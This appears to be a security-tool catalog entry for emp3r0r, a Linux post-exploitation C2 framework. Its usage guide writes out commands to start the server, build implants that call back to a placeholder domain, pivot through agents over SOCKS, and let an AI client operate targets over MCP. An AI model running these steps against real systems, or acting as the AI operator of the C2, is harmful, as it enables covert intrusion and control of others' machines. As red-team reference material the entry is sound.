---
name: "emp3r0r"
categories:
  - blackarch-automation
version: "v5.3.0.r0.g79c67d14"
homepage: "https://github.com/jm33-m0/emp3r0r"
packaged-by: [blackarch]
blackarch-builddate: "2026-10-31"
build-system: go
license: MIT
meta-checked: "2026-11-09"
github-repo: "jm33-m0/emp3r0r"
github-stars: 1812
github-pushed: "2026-11-07"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-07"
worth: 8.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 1408
gh-activity-checked: "2026-11-09"
---

# emp3r0r

> Linux-first multi-operator C2 with a self-healing agent mesh and in-memory execution.

## What it's for

emp3r0r is a post-exploitation command-and-control framework built around Linux targets (Windows agents are also supported). Its agents form a self-healing P2P mesh that relays through each other when the C2 link dies, execute post-exploitation logic entirely in memory (Windows BOF/COFF objects, Linux ELF objects, and Starlark scripts — no interpreter or plaintext artifacts left on disk), and keep files in an encrypted in-memory filesystem. The server supports HTTP polling, HTTP/2, and QUIC listeners plus custom transports (a Tor hidden-service transport ships as a reference), multiple operators connecting over WireGuard, SOCKS5 pivoting through agents, and an MCP server that lets external AI clients operate the C2 behind a deterministic OPSEC policy screen. Reach for it when you need resilient Linux footholds and pivoting; it is not a Windows-first framework. The operator console is a tmux application.

## Typical use cases

### Start the C2 server with operator accounts

Stand up the C2 and define who may connect.

```
emp3r0r server --c2-hosts 198.51.100.10 --http-port 12345 --operator-port 13377 --operators alice bob
```

Outcome: starts the C2 listener(s) and the operator endpoint, creates the named operator accounts, and prints the WireGuard keys/configuration each operator needs to connect.

### Connect an operator console

Attach to a running C2 from the operator machine.

```
emp3r0r client --c2-host 198.51.100.10 --operator-port 13377 --operator-wg-ip 10.0.0.2 --operator-wg-key '<OPERATOR_WG_KEY>' --server-wg-ip 10.0.0.1 --server-wg-key '<SERVER_WG_KEY>'
```

Outcome: opens the tmux-based operator console connected to the server over WireGuard; agents, modules, and jobs are managed from there.

### Build a direct-C2 Linux agent

Build the payload to deploy on a target (inside the operator console).

```
generate --type linux_executable --arch amd64 --cc your.domain.com
```

Outcome: compiles an agent binary configured to call back to your.domain.com, saved to the operator workspace under a feature-descriptive name; run it on a target and it appears as an agent in the console.

### Build a mesh agent that relays for peers

Keep deeper agents reachable when they cannot touch the C2 directly (inside the operator console).

```
generate --type linux_executable --arch amd64 --cc your.domain.com --p2p --direct-c2 --p2p-transport mtls --peers 198.51.100.20
```

Outcome: an agent that both calls the C2 directly and accepts mesh peer connections over mTLS, letting agents on isolated segments relay their traffic through it.

### Pivot through an agent with SOCKS

Reach the agent-side network from the operator machine.

```
socks_start 1080
tun2socks start --route 198.51.100.0/24
```

Outcome: a SOCKS5 listener on the operator side that exits through the selected agent, with only the listed subnet routed through the pivot — everything else keeps the operator's normal path.

### Drive the C2 from an MCP client

Let an external AI assistant operate targets under an OPSEC policy.

```
emp3r0r mcp
```

Outcome: exposes target selection, module inspection/execution, file transfer, and agent building over the Model Context Protocol on stdin/stdout; every mutating call is classified and allowed/warned/blocked per the `mcp.json` policy, with pre- and post-execution records written to an audit log.

*No corpus evidence — derived from upstream documentation.*
